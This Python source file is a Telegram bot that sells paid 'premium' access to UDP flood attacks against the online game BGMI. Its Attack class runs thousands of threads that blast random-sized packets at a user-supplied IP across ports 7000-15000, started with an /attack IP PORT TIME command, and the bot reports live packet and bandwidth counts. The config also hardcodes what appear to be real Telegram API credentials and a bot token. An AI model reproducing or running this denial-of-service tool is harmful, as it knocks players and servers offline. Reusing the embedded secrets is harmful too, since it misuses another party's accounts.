#!/usr/bin/env python3
"""
💎 PREMIUM BGMI ATTACK BOT - FIXED
"""

import asyncio, json, random, os, time, socket, threading, logging
from datetime import datetime
import pytz
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ═══════════ LOGGING ═══════════
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ═══════════ CONFIG ═══════════
API_ID = 35140329
API_HASH = "011f638e4acadee178c59afffc80193d"
BOT_TOKEN = "8603632286:AAEdNSOYN9IGUDV3mtweZ0jHqLg2keX7nbI"
OWNER_ID = 7614459746

IST = pytz.timezone('Asia/Kolkata')
LINE = "━━━━━━━━━━━━━━━━━━━"

# ═══════════ DB ═══════════
VIDEO_DB = "videos.json"
USERS_DB = "users.json"
used_videos = []

def load_json(f, d=None):
    try:
        if os.path.exists(f):
            with open(f) as fl: return json.load(fl)
    except: pass
    return d if d is not None else []

def save_json(f, d):
    with open(f, 'w') as fl: json.dump(d, fl)

def get_vids(): return load_json(VIDEO_DB, [])
def save_vid(path):
    vids = get_vids()
    vid = len(vids) + 1
    vids.append({"id": vid, "path": path, "name": os.path.basename(path)})
    save_json(VIDEO_DB, vids)
    return vid

def rand_vid():
    global used_videos
    vids = get_vids()
    if not vids: return None
    avail = [v for v in vids if v["id"] not in used_videos]
    if not avail:
        used_videos.clear()
        avail = vids
    v = random.choice(avail)
    used_videos.append(v["id"])
    if len(used_videos) > 50: used_videos = used_videos[-20:]
    return v

def is_prem(uid):
    if uid == OWNER_ID: return True
    u = load_json(USERS_DB, {"premium": []})
    return str(uid) in u.get("premium", [])

def add_prem(uid):
    u = load_json(USERS_DB, {"premium": []})
    if str(uid) not in u.get("premium", []):
        u.setdefault("premium", []).append(str(uid))
        save_json(USERS_DB, u)
        return True
    return False

def get_time():
    return datetime.now(IST).strftime("%I:%M %p")

# ═══════════ ATTACK ═══════════
class Attack:
    def __init__(self):
        self.on = False
        self.pkts = 0
        self.bytes_out = 0
        self.lock = threading.Lock()
    
    def flood(self, ip, port, end):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024*1024*8)
        s.settimeout(0.001)
        ports = list(range(7000, 15000))
        while self.on and time.time() < end:
            try:
                for _ in range(10):
                    if not self.on: break
                    p = random.randbytes(random.randint(500, 1500))
                    s.sendto(p, (ip, random.choice(ports)))
                    with self.lock: self.pkts += 1; self.bytes_out += len(p)
            except: pass
        s.close()
    
    def start(self, ip, port, dur, threads):
        self.on = True; self.pkts = 0; self.bytes_out = 0
        end = time.time() + dur
        workers = [threading.Thread(target=self.flood, args=(ip, port, end)) for _ in range(threads)]
        for w in workers: w.daemon = True; w.start()
        time.sleep(dur); self.on = False
        e = max(dur, 0.1)
        return {'pkts': self.pkts, 'mbps': (self.bytes_out*8)/(e*1e6), 'mb': self.bytes_out/1024/1024}

attacker = Attack()
attacking = False
attack_info = {}
attack_msg = None

# ═══════════ BOT ═══════════
print("Starting bot...")
app = Client("attack_bot_session", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

def menu_kb():
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("💀 ATTACK", callback_data="attack_menu"),
         InlineKeyboardButton("⛔ STOP", callback_data="stop_btn")],
        [InlineKeyboardButton("📊 STATUS", callback_data="status_btn"),
         InlineKeyboardButton("👤 PROFILE", callback_data="profile")],
        [InlineKeyboardButton("🎬 VIDEOS", callback_data="video_menu"),
         InlineKeyboardButton("💎 PREMIUM", callback_data="premium")],
        [InlineKeyboardButton("👑 ADMIN", callback_data="admin"),
         InlineKeyboardButton("ℹ️ HELP", callback_data="help")],
    ])

# ═══════════ HANDLERS ═══════════

@app.on_message(filters.command("start"))
async def start_cmd(client, msg):
    user = msg.from_user
    uid = user.id
    vid = rand_vid()
    
    text = f"""
💎 **PREMIUM BGMI ATTACK BOT** 💎

{LINE}
👤 **{user.first_name}**
🆔 `{uid}`
💳 {'💎 PREMIUM' if is_prem(uid) else '🆓 FREE'}
{LINE}

⚔️ `/attack IP PORT TIME`
📋 `/attack 1.2.3.4 8080 120`

🔽 **Select:**
"""
    
    try:
        if vid and os.path.exists(vid["path"]):
            await client.send_video(msg.chat.id, vid["path"], caption=text, reply_markup=menu_kb())
        else:
            await msg.reply_text(text, reply_markup=menu_kb())
    except Exception as e:
        logger.error(f"Start error: {e}")
        await msg.reply_text(text, reply_markup=menu_kb())

@app.on_message(filters.command("attack"))
async def attack_cmd(client, msg):
    global attacking, attack_info, attack_msg
    
    uid = msg.from_user.id
    
    if not is_prem(uid):
        return await msg.reply_text("💎 **PREMIUM ONLY!**\nContact owner for access.")
    
    if attacking:
        e = time.time() - attack_info['start']
        return await msg.reply_text(f"⚠️ Already attacking! {int(e)}s\n🛑 /stop")
    
    parts = msg.text.split()
    if len(parts) < 4:
        return await msg.reply_text("⚠️ `/attack IP PORT TIME`\n📋 `/attack 1.2.3.4 8080 120`")
    
    ip = parts[1]
    try: port = int(parts[2])
    except: return await msg.reply_text("❌ Invalid port!")
    try: dur = int(parts[3])
    except: return await msg.reply_text("❌ Invalid time!")
    
    threads = 5000 if is_prem(uid) else 500
    if dur > 600: dur = 600
    
    attack_info = {'ip': ip, 'port': port, 'time': dur, 'start': time.time()}
    attacking = True
    
    vid = rand_vid()
    start_text = f"💀 **ATTACK STARTED!**\n🎯 `{ip}:{port}`\n⏱️ `{dur}s`\n🧵 `{threads}` Threads"
    
    try:
        if vid and os.path.exists(vid["path"]):
            attack_msg = await client.send_video(msg.chat.id, vid["path"], caption=start_text)
        else:
            attack_msg = await msg.reply_text(start_text)
    except:
        attack_msg = await msg.reply_text(start_text)
    
    async def live():
        t0 = time.time()
        while attacking:
            await asyncio.sleep(2)
            try:
                e = time.time() - t0
                if e >= dur: break
                pct = (e/dur)*100
                bar = "█"*int(pct/5) + "░"*(20-int(pct/5))
                mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
                
                live_text = f"""
💀 **ATTACKING!**
🎯 `{ip}:{port}`
⏱️ `{int(e)}s` / `{dur}s`
[{bar}] `{pct:.0f}%`
📦 `{attacker.pkts:,}` pkts | 📶 `{mbps:.1f}` Mbps
🛑 `/stop`
"""
                await attack_msg.edit_text(live_text)
            except: pass
    
    asyncio.create_task(live())
    
    loop = asyncio.get_event_loop()
    stats = await loop.run_in_executor(None, attacker.start, ip, port, dur, threads)
    attacking = False
    
    done_text = f"""
✅ **ATTACK DONE!**
🎯 `{ip}:{port}`
⏱️ `{dur}s`
📦 `{stats['pkts']:,}` pkts
📶 `{stats['mbps']:.1f}` Mbps

🔄 `/attack IP PORT TIME`
"""
    
    vid = rand_vid()
    try:
        if vid and os.path.exists(vid["path"]):
            await client.send_video(msg.chat.id, vid["path"], caption=done_text)
    except: pass
    
    try:
        await attack_msg.edit_text(done_text)
    except: pass

@app.on_message(filters.command("stop"))
async def stop_cmd(client, msg):
    global attacking
    if attacking:
        attacker.on = False
        attacking = False
        await msg.reply_text("⛔ **STOPPED!**")
    else:
        await msg.reply_text("💤 No attack!")

@app.on_message(filters.command("status"))
async def status_cmd(client, msg):
    if attacking:
        e = time.time() - attack_info['start']
        mbps = (attacker.bytes_out*8)/(e*1e6) if e>0 else 0
        await msg.reply_text(f"🟢 **ATTACKING!**\n⏱️ {int(e)}s\n📦 {attacker.pkts:,} pkts\n📶 {mbps:.1f} Mbps")
    else:
        await msg.reply_text("💤 **IDLE**\n⚔️ /attack IP PORT TIME")

@app.on_message(filters.command("addvideo"))
async def add_vid_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    
    if msg.reply_to_message and msg.reply_to_message.video:
        s = await msg.reply_text("⏳ Downloading...")
        try:
            path = await msg.reply_to_message.download()
            vid = save_vid(path)
            await s.edit_text(f"✅ Video #{vid} added! Total: {len(get_vids())}")
        except Exception as e:
            await s.edit_text(f"❌ Error: {e}")
    else:
        await msg.reply_text("❌ Reply to a video!")

@app.on_message(filters.command("videos"))
async def list_vids_cmd(client, msg):
    vids = get_vids()
    if not vids:
        return await msg.reply_text("📹 No videos!")
    text = f"📹 **Videos ({len(vids)}):**\n\n"
    for v in vids[:20]:
        text += f"#{v['id']} `{v['name'][:30]}`\n"
    await msg.reply_text(text)

@app.on_message(filters.command("addpremium"))
async def add_prem_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    parts = msg.text.split()
    if len(parts) != 2: return await msg.reply_text("/addpremium USER_ID")
    
    if add_prem(parts[1]):
        await msg.reply_text(f"✅ `{parts[1]}` is now PREMIUM!")
    else:
        await msg.reply_text("Already premium!")

@app.on_message(filters.command("stats"))
async def stats_cmd(client, msg):
    if msg.from_user.id != OWNER_ID: return
    vids = get_vids()
    users = load_json(USERS_DB, {"premium": []})
    size = sum(os.path.getsize(v["path"]) for v in vids if os.path.exists(v["path"]))
    
    await msg.reply_text(
        f"📊 **STATS**\n\n"
        f"📹 Videos: {len(vids)}\n"
        f"💾 Size: {size/(1024*1024):.1f} MB\n"
        f"💎 Premium: {len(users.get('premium', []))}\n"
        f"⚡ Attack: {'🟢 On' if attacking else '💤 Idle'}"
    )

# ═══════════ CALLBACKS ═══════════

@app.on_callback_query()
async def callbacks(client, cb):
    data = cb.data
    uid = cb.from_user.id
    
    if data == "attack_menu":
        await cb.message.edit_text(
            "💀 **ATTACK MENU**\n\n"
            "⚔️ `/attack IP PORT TIME`\n"
            "📋 `/attack 1.2.3.4 8080 120`\n\n"
            "🎮 BGMI: 7000-15000",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "stop_btn":
        if attacking:
            attacker.on = False
            await cb.answer("⛔ Stopped!", show_alert=True)
        else:
            await cb.answer("💤 No attack", show_alert=True)
    
    elif data == "status_btn":
        if attacking:
            e = time.time() - attack_info['start']
            await cb.answer(f"🟢 {int(e)}s | {attacker.pkts:,} pkts", show_alert=True)
        else:
            await cb.answer("💤 IDLE", show_alert=True)
    
    elif data == "profile":
        await cb.message.edit_text(
            f"👤 **PROFILE**\n\n🆔 `{uid}`\n👤 {cb.from_user.first_name}\n💳 {'💎 PREMIUM' if is_prem(uid) else '🆓 FREE'}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "premium":
        await cb.message.edit_text(
            "💎 **PREMIUM**\n\n⚡ 5000 Threads\n⏱️ 600s Max\n👑 Priority\n\n💰 ₹299/month\n📲 Contact owner",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "video_menu":
        await cb.message.edit_text(
            f"🎬 **VIDEOS** ({len(get_vids())})\n\n📤 /addvideo (reply)\n📋 /videos\n🗑️ /delvideo ID\n🧹 /clearvideos",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "admin":
        if uid != OWNER_ID:
            await cb.answer("Owner only!", show_alert=True)
            return
        await cb.message.edit_text(
            "👑 **ADMIN**\n\n💎 /addpremium ID\n📊 /stats\n📹 /addvideo",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "help":
        await cb.message.edit_text(
            "ℹ️ **HELP**\n\n⚔️ /attack IP PORT TIME\n🛑 /stop\n📊 /status\n📹 /addvideo",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="back")]])
        )
    
    elif data == "back":
        vid = rand_vid()
        text = f"💎 **MAIN MENU**\n\n👤 {cb.from_user.first_name}\n💳 {'💎 PREMIUM' if is_prem(uid) else '🆓 FREE'}\n\n🔽 Select:"
        
        try:
            if vid and os.path.exists(vid["path"]):
                await cb.message.delete()
                await client.send_video(cb.message.chat.id, vid["path"], caption=text, reply_markup=menu_kb())
            else:
                await cb.message.edit_text(text, reply_markup=menu_kb())
        except:
            await cb.message.edit_text(text, reply_markup=menu_kb())

# ═══════════ INIT ═══════════
for f, d in [(VIDEO_DB, []), (USERS_DB, {"premium": []})]:
    if not os.path.exists(f):
        save_json(f, d)

os.makedirs("downloads", exist_ok=True)

print("\n" + "="*40)
print("💎 PREMIUM BOT READY!")
print(f"📹 Videos: {len(get_vids())}")
print(f"💀 Attack System: Active")
print("="*40 + "\n")

if __name__ == "__main__":
    app.run()
